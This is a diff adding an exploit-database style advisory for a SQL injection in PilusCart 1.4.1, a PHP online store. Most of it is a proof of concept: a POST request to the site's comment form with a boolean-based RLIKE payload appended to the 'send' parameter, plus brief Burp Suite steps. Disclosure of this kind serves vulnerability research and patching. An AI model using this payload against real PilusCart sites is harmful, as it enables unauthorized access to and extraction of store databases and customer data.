@@ -1,0 +1,34 @@
+####################################################################
+
+# Exploit Title: PilusCart 1.4.1 - 'send' SQL Vulnerability
+# Dork: N/A
+# Date: 10-02-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://sourceforge.net/projects/pilus/
+# Software Link: https://sourceforge.net/projects/pilus/
+# Version: 1.4.1
+# Category: Webapps
+# Tested on: Wampp @Win
+# CVE: N/A
+# Software Description: PilusCart is a web-based online store management system, written in PHP scripting language as the most popular web programming language today. To store the data, PilusCart uses MySQL relational database management system.
+
+####################################################################
+
+# Vulnerabilities / Impact
+# This web application called as PiLuS 1.4.1 version.
+# Switch to the http://localhost/PiLUS/read-apa-itu-pdo
+  fill in the red-colored parts that I have given in the link
+  https://i.hizliresim.com/MV11La.jpg
+  Get in with the burp suite. and add the payload
+  at the end of the request to the attack pattern.
+
+####################################################################
+
+# POC - SQL (Boolean Based String)
+# Parameters : send
+# Attack Pattern : RLIKE (case when  7488715=7488715 then
+0x656d69726f676c75 else 0x28 end)
+# POST Request :
+http://localhost/PiLUS/read-apa-itu-pdo?post_id=3&post_slug=apa-itu-pdo&nama_komentar=4866630&situs_web=9391510&captcha=4551404&token=473ec0c6bda264fefb8447c8ff01956248ea477c&isi_komentar=EMIROGLU2823174&send=Kirim
+RLIKE
+(case when  7488715=7488715 then 0x656d69726f676c75 else 0x28 end)
